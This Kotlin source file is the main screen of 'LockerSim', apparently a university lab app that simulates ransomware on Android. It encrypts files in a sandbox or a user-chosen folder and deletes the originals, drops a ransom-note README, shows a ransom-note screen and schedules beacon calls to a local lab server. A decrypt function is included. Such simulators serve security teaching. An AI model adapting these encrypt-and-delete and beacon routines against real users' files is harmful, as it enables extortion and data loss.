package au.edu.deakin.lab.lockersim

import android.content.ContentResolver
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.provider.OpenableColumns
import android.util.Log
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.documentfile.provider.DocumentFile
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import au.edu.deakin.lab.lockersim.beacon.BeaconWorker
import au.edu.deakin.lab.lockersim.data.FileRepo
import au.edu.deakin.lab.lockersim.databinding.ActivityMainBinding
import au.edu.deakin.lab.lockersim.ransom.RansomNoteActivity
import java.io.File

class MainActivity : AppCompatActivity() {

    private lateinit var b: ActivityMainBinding
    private lateinit var repo: FileRepo
    private val labUrl = "http://10.42.0.1:8000/beacon" // change to your laptop IP

    private val PREF = "locker"

    private val KEY_TREE = "treeUri"

    private val pickPhoto = registerForActivityResult(
        ActivityResultContracts.OpenDocument()
    ) { uri: Uri? ->
        if (uri != null) {
            val copied = copyToSandbox(uri)
            append("Imported ${copied.name} into sandbox")
        } else append("Import cancelled")
    }

    private val pickTree = registerForActivityResult(
        ActivityResultContracts.OpenDocumentTree()
    ) { uri ->
        if (uri != null) {
            val flags = Intent.FLAG_GRANT_READ_URI_PERMISSION or
                    Intent.FLAG_GRANT_WRITE_URI_PERMISSION
            // Persist the permission so it survives process death/reboot
            contentResolver.takePersistableUriPermission(uri, flags)
            saveTreeUri(uri)
            setTreeButtonsEnabled(true)
            val name = DocumentFile.fromTreeUri(this, uri)?.name ?: uri.lastPathSegment
            append("Chosen folder: $name (persisted)")
        } else {
            append("Folder selection cancelled")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        b = ActivityMainBinding.inflate(layoutInflater)
        setContentView(b.root)

        repo = FileRepo(this)
        b.status.text = "LockerSim (SIMULATION)\nDir: ${repo.dirPath()}"

        b.btnImport.setOnClickListener { importPhoto() }
        b.btnSeed.setOnClickListener {
            val n = repo.seedDummyFiles().size
            append("Seeded $n dummy files")
        }
        b.btnList.setOnClickListener {
            val files = repo.listFiles()
            append("Files (${files.size}):\n" + files.joinToString("\n") {
                " - ${it.name} (${it.length()} bytes)"
            })
        }
        b.btnEncrypt.setOnClickListener {
            val n = repo.encryptAll().size
            append("Encrypted $n files (now *.gcm)")
            if (n > 0) {
                // Optional: drop a README into the sandbox so it appears in 'ls -l'
                java.io.File(repo.dirPath(), "READ_ME_SIMULATION.txt")
                    .writeText(
                        "Your LockerSim demo files were encrypted (SIMULATION). " +
                                "Open the app and press DECRYPT to restore."
                    )

                // Show the ransom note screen
                startActivity(android.content.Intent(this, RansomNoteActivity::class.java))
            }
        }
        b.btnDecrypt.setOnClickListener {
            val n = repo.decryptAll().size
            append("Decrypted $n files")
        }
        b.btnBeacon.setOnClickListener {
            val work = OneTimeWorkRequestBuilder<BeaconWorker>()
                .setInputData(BeaconWorker.input(labUrl, bursts = 5, intervalSec = 60))
                .build()
            WorkManager.getInstance(this).enqueue(work)
            append("Beacon burst scheduled (5×,60s)")
        }
        b.btnPickDcim.setOnClickListener { pickTree.launch(null) }
        b.btnEncryptDcim.setOnClickListener { encryptChosenTree() }
        b.btnDecryptDcim.setOnClickListener { decryptChosenTree() }
        setTreeButtonsEnabled(getTreeDoc() != null)
    }

    private fun importPhoto() {
        // Let user pick a single image; SAF needs mime type filters
        pickPhoto.launch(arrayOf("image/*"))
    }

    private fun copyToSandbox(uri: Uri): File {
        val dir = File(getExternalFilesDir("locker"), "data").apply { mkdirs() }
        val name = queryDisplayName(uri) ?: "import_${System.currentTimeMillis()}.jpg"
        val out = File(dir, name)
        contentResolver.openInputStream(uri)!!.use { ins ->
            out.outputStream().use { outs -> ins.copyTo(outs) }
        }
        return out
    }

    private fun queryDisplayName(uri: Uri): String? {
        val cr: ContentResolver = contentResolver
        cr.query(uri, arrayOf(OpenableColumns.DISPLAY_NAME), null, null, null)?.use { c ->
            val idx = c.getColumnIndex(OpenableColumns.DISPLAY_NAME)
            if (idx >= 0 && c.moveToFirst()) return c.getString(idx)
        }
        return null
    }

    private fun setTreeButtonsEnabled(enabled: Boolean) {
        b.btnEncryptDcim.isEnabled = enabled
        b.btnDecryptDcim.isEnabled = enabled
    }

    private fun saveTreeUri(uri: Uri) {
        getSharedPreferences(PREF, MODE_PRIVATE).edit()
            .putString(KEY_TREE, uri.toString()).apply()
    }

    private fun getTreeDoc(): DocumentFile? {
        val s = getSharedPreferences(PREF, MODE_PRIVATE).getString(KEY_TREE, null) ?: return null
        return DocumentFile.fromTreeUri(this, Uri.parse(s))
    }

    private fun encryptChosenTree() {
        val tree = getTreeDoc() ?: return append("No folder chosen yet")
        var changed = 0
        for (doc in tree.listFiles()) {
            if (doc.isDirectory) continue
            val name = doc.name ?: continue
            if (name.endsWith(".gcm")) continue

            try {
                val plain = contentResolver.openInputStream(doc.uri)?.use { it.readBytes() } ?: continue
                val blob = au.edu.deakin.lab.lockersim.crypto.Crypto.encrypt(
                    plain, name.toByteArray()
                )
                val out = tree.createFile("application/octet-stream", "$name.gcm") ?: continue
                contentResolver.openOutputStream(out.uri, "w")?.use { it.write(blob) }
                doc.delete()
                changed++
            } catch (e: Exception) {
                append("Encrypt failed for $name: ${e.message}")
            }
        }
        append("Encrypted $changed files in chosen folder")
        if (changed > 0) {
            // optional artefact for your AoO evidence
            getTreeDoc()?.createFile(
                "text/plain", "READ_ME_SIMULATION.txt"
            )?.also { f ->
                contentResolver.openOutputStream(f.uri, "w")?.use {
                    it.write(
                        "Your LockerSim demo files were encrypted (SIMULATION). Open LockerSim and press DECRYPT to restore."
                            .toByteArray()
                    )
                }
            }
            startActivity(Intent(this, RansomNoteActivity::class.java))
        }
    }

    private fun decryptChosenTree() {
        val tree = getTreeDoc() ?: return append("No folder chosen yet")
        var changed = 0
        for (doc in tree.listFiles()) {
            if (doc.isDirectory) continue
            val name = doc.name ?: continue
            if (!name.endsWith(".gcm")) continue

            try {
                val blob = contentResolver.openInputStream(doc.uri)?.use { it.readBytes() } ?: continue
                val orig = name.removeSuffix(".gcm")
                val plain = au.edu.deakin.lab.lockersim.crypto.Crypto.decrypt(
                    blob, orig.toByteArray()
                )
                val out = tree.createFile("application/octet-stream", orig) ?: continue
                contentResolver.openOutputStream(out.uri, "w")?.use { it.write(plain) }
                doc.delete()
                changed++
            } catch (e: Exception) {
                append("Decrypt failed for $name: ${e.message}")
            }
        }
        append("Decrypted $changed files in chosen folder")
    }

    private fun append(s: String) {
        Log.d("LockerSim", s)
        b.output.append(s + "\n")
    }
}
